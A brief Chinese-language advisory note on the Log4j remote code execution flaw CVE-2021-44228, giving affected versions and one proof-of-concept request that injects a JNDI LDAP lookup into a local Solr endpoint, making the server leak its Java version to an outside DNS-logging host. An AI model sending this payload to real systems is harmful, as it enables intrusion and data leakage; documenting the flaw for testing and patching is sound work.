Log4j 漏洞

Apache Log4j2 是一款优秀的 Java 日志框架，大量的业务框架都使用了该组件。由于 Apache Log4j2 某些功能存在递归解析功能，攻击者可直接构造恶意请求，触发远程代码执行漏洞。

CVE 编号：CVE-2021-44228

受影响版本：log4j2 2.0-beta9~2.14.1

```
http://127.0.0.1:8983/solr/admin/cores?action=${jndi:ldap://${sys:java.version}.sg.dnslog.cn}
```

